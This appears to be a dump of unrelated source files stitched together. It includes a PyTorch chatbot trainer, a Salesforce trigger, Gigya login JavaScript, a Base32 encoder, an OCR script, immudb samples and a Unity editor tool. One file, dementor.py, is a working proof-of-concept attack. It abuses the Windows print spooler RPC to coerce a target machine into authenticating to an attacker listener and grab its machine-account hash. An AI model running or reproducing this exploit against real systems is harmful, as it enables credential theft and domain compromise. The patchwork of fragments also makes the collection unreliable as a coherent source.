 def __getitem__(self,index):
 return self.x_data[index],self.y_data[index]


 def __len__(self):
 return self.n_samples
 
 dataset = ChatDataset()


 train_loader = DataLoader(dataset=dataset,
 batch_size=batch_size,
 shuffle=True,
 num_workers=0)


 device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
 model = NeuralNet(input_size,hidden_size,output_size).to(device=device)
 criterion = nn.CrossEntropyLoss()
 optimizer = torch.optim.Adam(model.parameters(),lr=learning_rate)


 for epoch in range(num_epochs):
 for (words,labels)  in train_loader:
 words = words.to(device)
 labels = labels.to(dtype=torch.long).to(device)
 outputs = model(words)
 loss = criterion(outputs,labels)
 optimizer.zero_grad()
 loss.backward()
 optimizer.step()


 if (epoch+1) % 100 ==0:
 print(f'Epoch [{epoch+1}/{num_epochs}], Loss: {loss.item():.4f}')


 print(f'Final Loss : {loss.item():.4f}')


 data = {
 ""model_state"":model.state_dict(),
 ""input_size"":input_size,
 ""hidden_size"":hidden_size,
 ""output_size"":output_size,
 ""all_words"":all_words,
 ""tags"":tags
    }


 FILE = ""DataBase\\Tasks.pth""
 torch.save(data,FILE)


 print(f""Training Complete, File Saved To {FILE}"")
 print(""             "")


TrainTasks()


def TasksExecutor(query):


 class NeuralNet(nn.Module):


 def __init__(self,input_size,hidden_size,num_classes):
 super(NeuralNet,self).__init__()
 self.l1 = nn.Linear(input_size,hidden_size)
 self.l2 = nn.Linear(hidden_size,hidden_size)
 self.l3 = nn.Linear(hidden_size,num_classes)
 self.relu = nn.ReLU()


 def forward(self,x):
 out = self.l1(x)
 out = self.relu(out)
 out = self.l2(out)
 out = self.relu(out)
 out = self.l3(out)
 return out


 device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')


 with open('Data\\Tasks.json','r') as json_data:
 intents = json.load(json_data)


 FILE = ""DataBase\\Tasks.pth""
 data = torch.load(FILE)


 input_size = data[""input_size""]
 hidden_size = data[""hidden_size""]
 output_size = data[""output_size""]
 all_words = data[""all_words""]
 tags = data[""tags""]
 model_state = data[""model_state""]


 model = NeuralNet(input_size,hidden_size,output_size).to(device)
 model.load_state_dict(model_state)
 model.eval()


 Stemmer = PorterStemmer()


 def tokenize(sentence):
 return nltk.word_tokenize(sentence)


 def stem(word):
 return Stemmer.stem(word.lower())


 def bag_of_words(tokenized_sentence,words):
 sentence_word = [stem(word) for word in tokenized_sentence]
 bag = np.zeros(len(words),dtype=np.float32)


 for idx , w in enumerate(words):
 if w in sentence_word:
 bag[idx] = 1


 return bag


 sentence = str(query)


 sentence = tokenize(sentence)
 X = bag_of_words(sentence,all_words)
 X = X.reshape(1,X.shape[0])
 X = torch.from_numpy(X).to(device)


 output = model(X)


 _ , predicted = torch.max(output,dim=1)


 tag = tags[predicted.item()]


 probs = torch.softmax(output,dim=1)
 prob = probs[0][predicted.item()]


 if prob.item() > 0.75:


 for intent in intents['intents']:


 if tag == intent[""tag""]:


 reply = random.choice(intent[""responses""])
 
 return reply
"
"dementor.py
","#!/usr/bin/env python


# abuse cases and better implementation from the original discoverer: https://github.com/leechristensen/SpoolSample
# some code from https://www.exploit-db.com/exploits/2879/


import os
import sys
import argparse
import binascii
import ConfigParser
from time import sleep
from threading import Thread
from impacket import smbserver, smb
from impacket.dcerpc.v5 import transport
from impacket.structure import Structure
from impacket.uuid import uuidtup_to_bin


MSRPC_UUID_SPOOLSS = uuidtup_to_bin(('12345678-1234-ABCD-EF00-0123456789AB', '1.0'))
target = ''
listener = ''
debug = False


show_banner = """"""
 
     **                                                                                        
      **                                                         *                             
      **                                                        **                             
      **                                                        **                             
      **                                                      ********    ****    ***  ****    
  *** **      ***    *** **** ****       ***    ***  ****    ********    * ***  *  **** **** * 
 *********   * ***    *** **** ***  *   * ***    **** **** *    **      *   ****    **   ****  
**   ****   *   ***    **  **** ****   *   ***    **   ****     **     **    **     **         
**    **   **    ***   **   **   **   **    ***   **    **      **     **    **     **         
**    **   ********    **   **   **   ********    **    **      **     **    **     **         
**    **   *******     **   **   **   *******     **    **      **     **    **     **         
**    **   **          **   **   **   **          **    **      **     **    **     **         
**    **   ****    *   **   **   **   ****    *   **    **      **      ******      ***        
 *****      *******    ***  ***  ***   *******    ***   ***      **      ****        ***       
  ***        *****      ***  ***  ***   *****      ***   ***                                   
 
        rough PoC to connect to spoolss to elicit machine account authentication
        implementation by @3xocyte, idea/discovery by @tifkin_, rediscovery and 
        code fixes for Windows 10/2016 by @elad_shamir
""""""


# printer and listener struct
class type1(Structure):
 alignment = 4
 structure = (
        ('id', '<L'),    # printer name referent ID
        ('max', '<L'),
        ('offset', '<L=0'),
        ('actual', '<L'),
        ('str', '%s'),
    )


# client and user struct
class type2(Structure):
 alignment = 4
 structure = (
        ('max', '<L'),
        ('offset', '<L=0'),
        ('actual', '<L'),
        ('str', '%s'),
    )


# create RpcOpenPrinterEx struct
class OpenPrinterEx(Structure):
 alignment = 4
 opnum = 69
 structure = (
        ('printer', ':', type1),
        ('null', '<L=0'),
        ('str', '<L=0'),
        ('null2', '<L=0'),
        ('access', '<L=0x00020002'),
        ('level', '<L=1'),
        ('id1', '<L=1'),
        ('level2', '<L=131076'),   # user level 1 infolevel
        ('size', '<L=28'),
        ('id2', '<L=0x00020008'),    # client referent id
        ('id3', '<L=0x0002000c'),    # user referent id
        ('build', '<L=8000'),
        ('major', '<L=0'),
        ('minor', '<L=0'),
        ('processor', '<L=0'),
        ('client', ':', type2),
        ('user', ':', type2),
    )


# partialy create RemoteFindFirstPrinterChangeNotificationEx struct
class RemoteFindFirstPrinterChangeNotificationEx(Structure):
 alignment =4
 opnum = 65
 structure = (
        ('flags', '<L=0'),
        ('options', '<L=0'),
        ('server', ':', type1),
        ('local','<L=123'),                     # Printer local
    )


class SMBServer(Thread):
 def __init__(self):
 Thread.__init__(self)
 self.smb = None


 def run(self):
 # mini config for the server
 smbConfig = ConfigParser.ConfigParser()
 smbConfig.add_section('global')
 smbConfig.set('global', 'server_name','server_name')
 smbConfig.set('global', 'server_os','Windows')
 smbConfig.set('global', 'server_domain','WORKGROUP')
 smbConfig.set('global', 'log_file','')
 smbConfig.set('global', 'credentials_file','')
 smbConfig.set(""global"", 'SMB2Support', 'True') 


 # fake ipc$
 smbConfig.add_section('IPC$')
 smbConfig.set('IPC$', 'comment', '')
 smbConfig.set('IPC$', 'read only', 'yes')
 smbConfig.set('IPC$', 'share type', '3')
 smbConfig.set('IPC$', 'path')


 self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
 self.smb.processConfigFile()
 # unregister dangerous commands
 self.smb.unregisterSmbCommand(smb.SMB.SMB_COM_CREATE_DIRECTORY)
 self.smb.unregisterSmbCommand(smb.SMB.SMB_COM_DELETE_DIRECTORY)
 self.smb.unregisterSmbCommand(smb.SMB.SMB_COM_RENAME)
 self.smb.unregisterSmbCommand(smb.SMB.SMB_COM_DELETE)
 self.smb.unregisterSmbCommand(smb.SMB.SMB_COM_WRITE)
 self.smb.unregisterSmbCommand(smb.SMB.SMB_COM_WRITE_ANDX)


 try:
 self.smb.serve_forever()
 except:
 pass


 def stop(self):
 self.smb.socket.close()
 self.smb.server_close()
 self._Thread__stop()


# build RpcOpenPrinterEx() struct
def open_printer(username, client):
 query = OpenPrinterEx()
 printer = ""\\\\%s\x00"" % (target)                   # blank printer
 query['printer'] = type1()
 query['printer']['id'] = 0x00020000 # referent ID for printer
 query['printer']['max'] = len(printer)              # printer max size
 query['printer']['actual'] = len(printer)           # printer actual size
 query['printer']['str'] = printer.encode('utf_16_le')
 query['client'] = type2()
 query['client']['max'] = len(client)
 query['client']['actual'] = len(client)
 query['client']['str'] = client.encode('utf_16_le')
 query['user'] = type2()
 query['user']['max'] = len(username)
 query['user']['actual'] = len(username)
 query['user']['str'] = username.encode('utf_16_le')
 return query


# partially build RpcRemoteFindFirstPrinterChangeNotificationEx() struct
def rffpcnex():
 query = RemoteFindFirstPrinterChangeNotificationEx()
 server = '\\\\%s\x00' % (listener)                  # server
 query['server'] = type1()
 query['server']['id'] = 0x41414141 # referent ID for server
 query['server']['max'] = len(server)                # server name max size
 query['server']['actual'] = len(server)             # server name actual size
 query['server']['str'] = server.encode('utf_16_le')
 return query


def call_open_printer(dce, user, client):
 global debug
 print ""[*] getting context handle...""
 query = open_printer(user,client)
 try:
 dce.call(query.opnum, query)
 raw = dce.recv()
 if debug == True: print ""[*] raw response: "" + binascii.hexlify(raw)
 handle = raw[:20]
 if debug == True: print ""[*] handle is: "" + binascii.hexlify(handle)
 except Exception as e:
 print ""[*] exception "" + str(e)
 dce.disconnect()
 sys.exit()
 return handle


def grab_hash(dce, handle):
 global debug
 print ""[*] sending RFFPCNEX...""
 # because I'm lazy
 options_container = (''
 '\x04\x00\x02\x00' # referent id
 '\x02\x00\x00\x00' # version
 '\xce\x55\x00\x00' # flags
 '\x02\x00\x00\x00' # count
 # notify options blob to unpack another day
 '\x08\x00\x02\x00\x02\x00\x00\x00\x00\x00\xce\x55\x00\x00'
 '\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x02\x00'
 '\x01\x00\x00\x00\xe0\x11\xbd\x8f\xce\x55\x00\x00\x01\x00'
 '\x00\x00\x10\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00'
 '\x01\x00\x00\x00\x00\x00'
    )
 # call function to get method core
 query = rffpcnex()
 # hack to compensate for laziness
 full_query = handle
 full_query += str(query)
 full_query += options_container


 try:
 dce.call(query.opnum, full_query)
 raw = dce.recv()
 if debug == True: print ""[*] raw response: "" + binascii.hexlify(raw)
 except Exception as e:
 print ""[*] exception "" + str(e)
 dce.disconnect()
 sys.exit()


def create_connection(domain, username, password, ntlm):
 # set up connection prereqs
 # creds
 creds={}
 creds['username'] = username
 creds['password'] = password
 creds['domain'] = domain
 creds['nthash'] = ntlm
 # to transport
 stringBinding = r'ncacn_np:%s[\pipe\spoolss]' % target
 rpctransport = transport.DCERPCTransportFactory(stringBinding)
 if hasattr(rpctransport, 'set_credentials'):
 rpctransport.set_credentials(creds['username'], creds['password'], creds['domain'], creds['nthash'])
 dce = rpctransport.get_dce_rpc()
 # actually connect
 print ""[*] connecting to %s"" % target
 try:
 dce.connect()
 except Exception as e:
 if ""STATUS_ACCESS_DENIED"" in str(e):
 print ""[*] access denied""
 sys.exit()
 else:
 print ""[*] unhandled exception occured: "" + str(e)
 sys.exit()
 # defines the printer endpoint
 try:
 dce.bind(MSRPC_UUID_SPOOLSS)
 except Exception as e:
 print ""[*] unhandled exception: "" + str(e)
 sys.exit()
 print ""[+] bound to spoolss""
 return dce


def main():


 # globals
 global target
 global listener
 global debug
 global show_banner


 parser = argparse.ArgumentParser(add_help = True, description = ""dementor - rough PoC to connect to spoolss to elicit machine account authentication (implementation by @3xocyte, idea/discovery by @tifkin_, rediscovery and code fixes by @elad_shamir)"")
 parser.add_argument('-u', '--username', action=""store"", default='', help='valid username')
 parser.add_argument('-p', '--password', action=""store"", default='', help='valid password')
 parser.add_argument('-d', '--domain', action=""store"", default='', help='valid domain name')
 parser.add_argument('--ntlm', action=""store"", default='', help='nt hash')
 parser.add_argument('--server', action='store_true', default=False, help='create smb listener')
 parser.add_argument('--debug', action=""store_true"", default=False, help='enable debugging')
 parser.add_argument('-q', '--banner', action=""store_true"", default=False,help='show banner')
 parser.add_argument('listener', help='ip address or hostname of listener')
 parser.add_argument('target', help='ip address or hostname of target')


 options = parser.parse_args()


 domain = options.domain
 username = options.username
 password = options.password
 ntlm = options.ntlm
 server = options.server
 listener = options.listener
 target = options.target
 debug = options.debug
 banner = options.banner


 if banner == True:
 print show_banner


 if server == True:
 print ""[*] starting smb server...""
 server_thread = SMBServer()
 server_thread.daemon = True
 server_thread.start()
 sleep(1) # ensure server starts before continuing
 print ""[+] server running""


 dce = create_connection(domain, username, password, ntlm)
 handle = call_open_printer(dce, domain+""\\""+username+""\x00"", listener+""\x00"")
 grab_hash(dce, handle)
 print ""[+] done!""
 dce.disconnect()
 sys.exit()


if __name__ == '__main__':
 main()
==<SEPERATOR>==
DispatcherClass.java
public class ContactTriggerDispatcher {
 public static void dispatch (System.TriggerOperation operationType){
 switch on operationType{
 WHEN BEFORE_INSERT{
 ContactTriggerHandler.beforeInsert(trigger.new);
            }
        }
    }
}
public with sharing class ContactTriggerHandler {    
 public Static void beforeInsert(List<Contact>contactList){
 List<string>contactFirstNameList = new List<String>();
 List<string>contactLastNameList = new List<String>();
 List<String>contactEmailList = new List<String>();
 for(Contact con : contactList){
 contactFirstNameList.add(con.FirstName);
 contactLastNameList.add(con.LastName);
 contactEmailList.add(con.Email);
        }
 List<Contact> contactQueryList = [SELECT Id, FirstName, LastName, Email 
 FROM Contact 
 WHERE FirstName =: contactFirstNameList AND 
 LastName =: contactLastNameList AND Email =: contactEmailList];
 
 List<String>existingFirstNameList = new List<String>();
 List<String>existingLastNameList = new List<String>();
 List<String>existingEmailList = new List<String>();
 for(Contact con : contactQueryList){
 existingFirstNameList.add(con.FirstName);
 existingLastNameList.add(con.LastName);
 existingEmailList.add(con.Email);
        }
 for(Contact con : contactList){
 if(existingFirstNameList.contains(con.FirstName) && 
 existingLastNameList.contains(con.LastName) && 
 existingEmailList.contains(con.Email)){
 con.addError ('You can\'t save the duplicate contact with same name and email ');
            }
 else{
 existingFirstNameList.add(con.FirstName);
 existingLastNameList.add(con.LastName);
 existingEmailList.add(con.Email);
            }
        }
    }
 }
trigger ContactTrigger on Contact (before insert) {
 ContactTriggerDispatcher.dispatch(Trigger.OperationType);
}
==<SEPERATOR>==
showScreenSets.js
function resizeScreenSetFields(){
 $('.gigya-screen input').parents('.gigya-layout-cell').each(function(){
 if(parseInt($('.gigya-screen:visible').width()) == 375){
 $(this).css({
 'min-width' : (parseInt($('.gigya-screen:visible').width()) - 40) + 'px',
 'width' : (parseInt($('.gigya-screen:visible').width()) - 40) + 'px'
 })
 } else {
 $(this).css({
 'min-width' : '',
 'width' : ''
 })
 }
 });
}


function showGigyaScreenSets(){
 var authFlow = 'popup';


 if(gigya.isMobile){
 authFlow = 'redirect';
 }


 gigya.accounts.showScreenSet({
 screenSet : screenSet,
 containerID : container,
 startScreen : startScreen,
 authFlow : authFlow,
 onBeforeSubmit : function(event){
 $('.gigya-error-msg').text('').removeClass('gigya-error-msg-active');
 },
 onAfterSubmit : function(event){
 if(event.screen == 'gigya-update-profile-screen' && event.response.errorCode == 0){
 $('.gigya-success-msg').text('Your info has been updated successfully.');
 console.log('success');
 }
 },
 onError : function(event){
 if(event.response.errorCode == 400003){
 startScreen = 'gigya-login-screen';
 showGigyaScreenSets();
 }
 },
 onBeforeScreenLoad : function(event){
 if(event.nextScreen != 'gigya-login-screen' && event.nextScreen != 'gigya-register-screen'){
 $('#'+container).css({'max-width':'375px', 'margin' : '0 auto'});
 }
 },
 onAfterScreenLoad : function(event){
 var compositeControls = $('.gigya-composite-control');
 $('.gigya-input-submit:visible').addClass('gigya-transparency');
 $.each(compositeControls, function(index, compositeControl){
 if($(compositeControl).find('.validation-indicator').length < 1){
 $(compositeControl).append('<span class=""validation-indicator""></span>');
 }
 });
 $('.gigya-screen .show-password').on('change', function(){
 if($(this).is(':checked')){
 $('[name=""password""]:visible').attr('type', 'text');
 } else {
 $('[name=""password""]:visible').attr('type', 'password');
 }
 });
 $('.gigya-social-login-container').height(function(){
 console.log($(this).find('[data-gigya-provider]:visible').length * 75);
 var currentSocialLoginContainerHeight = $(this).height();
 var newSocialLoginContainerHeight = $(this).find('[data-gigya-provider]:visible').length * 75;
 if(newSocialLoginContainerHeight >= currentSocialLoginContainerHeight){
 return newSocialLoginContainerHeight + 'px';
 } else {
 return currentSocialLoginContainerHeight + 'px';
 }
 });
 $(window).off('resize', resizeScreenSetFields);
 resizeScreenSetFields();
 $(window).on('resize', resizeScreenSetFields);
 },
 onFieldChanged : function(event){
 var field = $('#' + event.form + ' [name=""' + event.field + '""]');
 var compositeControl = field.parents('.gigya-composite-control') ;
 if(compositeControl.find('.validation-indicator').length < 1){
 compositeControl.append('<span class=""validation-indicator""></span>');
 }
 if(!event.isValid || compositeControl.find('input.gigya-error').length > 0){
 compositeControl.find('.validation-indicator').css('background-position', '30px 0px');
 field.removeClass('gigya-valid').addClass('gigya-error');
 } else {
 compositeControl.find('.validation-indicator').css('background-position', '0px 0px');
 field.removeClass('gigya-error');
 }
 if(($('input:visible').length - 1) == $('input.gigya-valid:visible').length){
 $('.gigya-input-submit:visible').removeClass('gigya-transparency');
 }
 },
 onHide : function(event){
 }
 });
}
showGigyaScreenSets();
"
"Base32.cs
","/*
 * Derived from https://github.com/google/google-authenticator-android/blob/master/AuthenticatorApp/src/main/java/com/google/android/apps/authenticator/Base32String.java
 * 
 * Copyright (C) 2016 BravoTango86
 *
 * Licensed under the Apache License, Version 2.0 (the ""License"");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an ""AS IS"" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


using System;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;


public static class Base32
{
 private static readonly char[] _digits = ""ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"".ToCharArray();
 private const int _mask = 31;
 private const int _shift = 5;


 private static int CharToInt(char c)
 {
 switch (c)
 {
 case 'A': return 0;
 case 'B': return 1;
 case 'C': return 2;
 case 'D': return 3;
 case 'E': return 4;
 case 'F': return 5;
 case 'G': return 6;
 case 'H': return 7;
 case 'I': return 8;
 case 'J': return 9;
 case 'K': return 10;
 case 'L': return 11;
 case 'M': return 12;
 case 'N': return 13;
 case 'O': return 14;
 case 'P': return 15;
 case 'Q': return 16;
 case 'R': return 17;
 case 'S': return 18;
 case 'T': return 19;
 case 'U': return 20;
 case 'V': return 21;
 case 'W': return 22;
 case 'X': return 23;
 case 'Y': return 24;
 case 'Z': return 25;
 case '2': return 26;
 case '3': return 27;
 case '4': return 28;
 case '5': return 29;
 case '6': return 30;
 case '7': return 31;
 }
 return -1;
 }


 public static byte[] FromBase32String(string encoded)
 {
 if (encoded == null)
 throw new ArgumentNullException(nameof(encoded));


 // Remove whitespace and padding. Note: the padding is used as hint 
 // to determine how many bits to decode from the last incomplete chunk
 // Also, canonicalize to all upper case
 encoded = encoded.Trim().TrimEnd('=').ToUpper();
 if (encoded.Length == 0)
 return new byte[0];


 var outLength = encoded.Length * _shift / 8;
 var result = new byte[outLength];
 var buffer = 0;
 var next = 0;
 var bitsLeft = 0;
 var charValue = 0;
 foreach (var c in encoded)
 {
 charValue = CharToInt(c);
 if (charValue < 0)
 throw new FormatException(""Illegal character: `"" + c + ""`"");


 buffer <<= _shift;
 buffer |= charValue & _mask;
 bitsLeft += _shift;
 if (bitsLeft >= 8)
 {
        result[next++] = (byte)(buffer >> (bitsLeft - 8));
 bitsLeft -= 8;
 }
 }


 return result;
 }


 public static string ToBase32String(byte[] data, bool padOutput = false)
 {
 return ToBase32String(data, 0, data.Length, padOutput);
 }


 public static string ToBase32String(byte[] data, int offset, int length, bool padOutput = false)
 {
 if (data == null)
 throw new ArgumentNullException(nameof(data));


 if (offset < 0)
 throw new ArgumentOutOfRangeException(nameof(offset));


 if (length < 0)
 throw new ArgumentOutOfRangeException(nameof(length));


 if ((offset + length) > data.Length)
 throw new ArgumentOutOfRangeException();


 if (length == 0)
 return """";


 // SHIFT is the number of bits per output character, so the length of the
 // output is the length of the input multiplied by 8/SHIFT, rounded up.
 // The computation below will fail, so don't do it.
 if (length >= (1 << 28))
 throw new ArgumentOutOfRangeException(nameof(data));


 var outputLength = (length * 8 + _shift - 1) / _shift;
 var result = new StringBuilder(outputLength);


 var last = offset + length;
 int buffer = data[offset++];
 var bitsLeft = 8;
 while (bitsLeft > 0 || offset < last)
 {
 if (bitsLeft < _shift)
 {
 if (offset < last)
 {
 buffer <<= 8;
 buffer |= (data[offset++] & 0xff);
 bitsLeft += 8;
 }
 else
 {
 int pad = _shift - bitsLeft;
 buffer <<= pad;
 bitsLeft += pad;
 }
 }
 int index = _mask & (buffer >> (bitsLeft - _shift));
 bitsLeft -= _shift;
      result.Append(_digits[index]);
 }
 if (padOutput)
 {
 int padding = 8 - (result.Length % 8);
 if (padding > 0) result.Append('=', padding == 8 ? 0 : padding);
 }
 return result.ToString();
 }
}
"
"cellrecognition.py
","import cv2
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import csv


try:
 from PIL import Image
except ImportError:
 import Image
import pytesseract


#read your file
file=r'/Users/marius/Desktop/Masterarbeit/Medium/Medium.png'
img = cv2.imread(file,0)
img.shape


#thresholding the image to a binary image
thresh,img_bin = cv2.threshold(img,128,255,cv2.THRESH_BINARY | cv2.THRESH_OTSU)


#inverting the image 
img_bin = 255-img_bin
cv2.imwrite('/Users/marius/Desktop/cv_inverted.png',img_bin)
#Plotting the image to see the output
plotting = plt.imshow(img_bin,cmap='gray')
plt.show()


# countcol(width) of kernel as 100th of total width
kernel_len = np.array(img).shape[1]//100
# Defining a vertical kernel to detect all vertical lines of image 
ver_kernel = cv2.getStructuringElement(cv2.MORPH_RECT, (1, kernel_len))
# Defining a horizontal kernel to detect all horizontal lines of image
hor_kernel = cv2.getStructuringElement(cv2.MORPH_RECT, (kernel_len, 1))
# A kernel of 2x2
kernel = cv2.getStructuringElement(cv2.MORPH_RECT, (2, 2))


#Use vertical kernel to detect and save the vertical lines in a jpg
image_1 = cv2.erode(img_bin, ver_kernel, iterations=3)
vertical_lines = cv2.dilate(image_1, ver_kernel, iterations=3)
cv2.imwrite(""/Users/marius/Desktop/vertical.jpg"",vertical_lines)
#Plot the generated image
plotting = plt.imshow(image_1,cmap='gray')
plt.show()


#Use horizontal kernel to detect and save the horizontal lines in a jpg
image_2 = cv2.erode(img_bin, hor_kernel, iterations=3)
horizontal_lines = cv2.dilate(image_2, hor_kernel, iterations=3)
cv2.imwrite(""/Users/marius/Desktop/horizontal.jpg"",horizontal_lines)
#Plot the generated image
plotting = plt.imshow(image_2,cmap='gray')
plt.show()


# Combine horizontal and vertical lines in a new third image, with both having same weight.
img_vh = cv2.addWeighted(vertical_lines, 0.5, horizontal_lines, 0.5, 0.0)
#Eroding and thesholding the image
img_vh = cv2.erode(~img_vh, kernel, iterations=2)
thresh, img_vh = cv2.threshold(img_vh,128,255, cv2.THRESH_BINARY | cv2.THRESH_OTSU)
cv2.imwrite(""/Users/marius/Desktop/img_vh.jpg"", img_vh)
bitxor = cv2.bitwise_xor(img,img_vh)
bitnot = cv2.bitwise_not(bitxor)
#Plotting the generated image
plotting = plt.imshow(bitnot,cmap='gray')
plt.show()


# Detect contours for following box detection
contours, hierarchy = cv2.findContours(img_vh, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)


def sort_contours(cnts, method=""left-to-right""):
 # initialize the reverse flag and sort index
 reverse = False
 i = 0
 # handle if we need to sort in reverse
 if method == ""right-to-left"" or method == ""bottom-to-top"":
 reverse = True
 # handle if we are sorting against the y-coordinate rather than
 # the x-coordinate of the bounding box
 if method == ""top-to-bottom"" or method == ""bottom-to-top"":
 i = 1
 # construct the list of bounding boxes and sort them from top to
 # bottom
 boundingBoxes = [cv2.boundingRect(c) for c in cnts]
    (cnts, boundingBoxes) = zip(*sorted(zip(cnts, boundingBoxes),
 key=lambda b:b[1][i], reverse=reverse))
 # return the list of sorted contours and bounding boxes
 return (cnts, boundingBoxes)


# Sort all the contours by top to bottom.
contours, boundingBoxes = sort_contours(contours, method=""top-to-bottom"")


#Creating a list of heights for all detected boxes
heights = [boundingBoxes[i][3] for i in range(len(boundingBoxes))]


#Get mean of heights
mean = np.mean(heights)


#Create list box to store all boxes in  
box = []
# Get position (x,y), width and height for every contour and show the contour on image
for c in contours:
 x, y, w, h = cv2.boundingRect(c)
 if (w<1000 and h<500):
 image = cv2.rectangle(img,(x,y),(x+w,y+h),(0,255,0),2)
 box.append([x,y,w,h])
 
plotting = plt.imshow(image,cmap='gray')
plt.show()


#Creating two lists to define row and column in which cell is located
row=[]
column=[]
j=0


#Sorting the boxes to their respective row and column
for i in range(len(box)):    
 
 if(i==0):
 column.append(box[i])
 previous=box[i]    
 
 else:
 if(box[i][1]<=previous[1]+mean/2):
 column.append(box[i])
 previous=box[i]            
 
 if(i==len(box)-1):
 row.append(column)        
 
 else:
 row.append(column)
 column=[]
 previous = box[i]
 column.append(box[i])
 
print(column)
print(row)


#calculating maximum number of cells
countcol = 0
for i in range(len(row)):
 countcol = len(row[i])
 if countcol > countcol:
 countcol = countcol


#Retrieving the center of each column
center = [int(row[i][j][0]+row[i][j][2]/2) for j in range(len(row[i])) if row[0]]


center=np.array(center)
center.sort()
print(center)
#Regarding the distance to the columns center, the boxes are arranged in respective order


finalboxes = []
for i in range(len(row)):
 lis=[]
 for k in range(countcol):
 lis.append([])
 for j in range(len(row[i])):
 diff = abs(center-(row[i][j][0]+row[i][j][2]/4))
 minimum = min(diff)
 indexing = list(diff).index(minimum)
 lis[indexing].append(row[i][j])
 finalboxes.append(lis)




#from every single image-based cell/box the strings are extracted via pytesseract and stored in a list
outer=[]
for i in range(len(finalboxes)):
 for j in range(len(finalboxes[i])):
 inner=''
 if(len(finalboxes[i][j])==0):
 outer.append(' ')
 else:
 for k in range(len(finalboxes[i][j])):
 y,x,w,h = finalboxes[i][j][k][0],finalboxes[i][j][k][1], finalboxes[i][j][k][2],finalboxes[i][j][k][3]
 finalimg = bitnot[x:x+h, y:y+w]
 kernel = cv2.getStructuringElement(cv2.MORPH_RECT, (2, 1))
 border = cv2.copyMakeBorder(finalimg,2,2,2,2, cv2.BORDER_CONSTANT,value=[255,255])
 resizing = cv2.resize(border, None, fx=2, fy=2, interpolation=cv2.INTER_CUBIC)
 dilation = cv2.dilate(resizing, kernel,iterations=1)
 erosion = cv2.erode(dilation, kernel,iterations=2)
 
 out = pytesseract.image_to_string(erosion)
 if(len(out)==0):
 out = pytesseract.image_to_string(erosion, config='--psm 3')
 inner = inner +"" ""+ out
 outer.append(inner)


#Creating a dataframe of the generated OCR list
arr = np.array(outer)
dataframe = pd.DataFrame(arr.reshape(len(row), countcol))
print(dataframe)
data = dataframe.style.set_properties(align=""left"")
#Converting it in a excel-file
data.to_excel(""/Users/marius/Desktop/output.xlsx"")
==<SEPERATOR>==
vault.py
import requests




API_KEY = ""YOUR API KEY""


resp = requests.put(""https://vault.immudb.io/ics/api/v1/ledger/default/collection/default/document"", headers = {
 ""X-API-KEY"": API_KEY,
 ""content-type"": ""application/json""
}, json = {
 ""reddit"": ""Welcome!""
})
documentID = resp.json()[""documentId""]


resp = requests.post(""https://vault.immudb.io/ics/api/v1/ledger/default/collection/default/documents/search"", headers = {
 ""X-API-KEY"": API_KEY,
 ""content-type"": ""application/json""
}, json = {
 ""query"": {
 ""expressions"": [
            {
 ""fieldComparisons"": [
                {
 ""field"": ""_id"",
 ""operator"": ""EQ"",
 ""value"": documentID
                }
            ]
            }
        ], 
    },
 ""page"": 1,
 ""perPage"": 10
})


print(resp.json())
==<SEPERATOR>==
pagination.py
from immudb.client import ImmudbClient
import uuid
MAX_N = 2000
def main():
 client = ImmudbClient(""localhost:3322"")
 client.login(""immudb"", ""immudb"", ""defaultdb"")
 client.sqlExec(""""""CREATE TABLE IF NOT EXISTS pagination( ID INTEGER AUTO_INCREMENT, VALUE VARCHAR[255], PRIMARY KEY(ID) )"""""")


 for index in range(0, MAX_N):
 print(""Adding records..."", index, f""{round((index / MAX_N) * 100, 2)}%"")
 value = str(uuid.uuid4())
 client.sqlExec(""INSERT INTO pagination(VALUE) VALUES(@someValue)"", {""someValue"": value})


 query = """"""SELECT ID, VALUE FROM pagination ORDER BY ID LIMIT 999""""""


 # Pagination method
 wholeResult = []
 result = client.sqlQuery(query)
 while result:
 wholeResult.extend(result)
 queryNext = """"""SELECT ID, VALUE FROM pagination WHERE id > @lastId ORDER BY ID LIMIT 999""""""
 lastId = result[-1][0]
 result = client.sqlQuery(queryNext, {""lastId"": lastId})
 print(len(wholeResult))


 # Offset method - less performance
 wholeResult = []
 result = client.sqlQuery(query)
 offset = 0
 query = f""""""SELECT ID, VALUE FROM pagination ORDER BY ID LIMIT 999""""""
 while result:
 offset = offset + len(result)
 wholeResult.extend(result)
 queryNext = f""""""SELECT ID, VALUE FROM pagination ORDER BY ID LIMIT 999 OFFSET {offset}""""""
 lastId = result[-1][0]
 result = client.sqlQuery(queryNext)
 print(len(wholeResult))


main()
"
"DuplicateAssetDetector.cs
","using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using UnityEditor;
using UnityEditor.IMGUI.Controls;
using UnityEngine;
using Object = UnityEngine.Object;


// How it works
// For Textures: texture is downsampled to 32x32 pixels and then its pixels are used to calculate a hash value
// For other assets: the file's MD5 hash is calculated
// Assets that have the same hash value are considered to be the same. Since the algorithm is only hash-based, there might be rare false positives
public class DuplicateAssetDetector : EditorWindow, IHasCustomMenu
{
 [Serializable]
 private class DuplicateAssets
 {
 public class Comparer : IComparer<DuplicateAssets>
 {
 public bool sortByExtension;


 public int Compare( DuplicateAssets x, DuplicateAssets y )
 {
 if( sortByExtension )
 {
 string extension1 = Path.GetExtension( x.paths[0] ) ?? """";
 string extension2 = Path.GetExtension( y.paths[0] ) ?? """";


 int comparison = extension1.CompareTo( extension2 );
 if( comparison != 0 )
 return comparison;
 }


 return x.paths[0].CompareTo( y.paths[0] );
 }
 }


 public List<string> paths = new List<string>();
 }


 [Serializable]
 private class SaveData
 {
 public List<DuplicateAssets> duplicates = new List<DuplicateAssets>();
 }


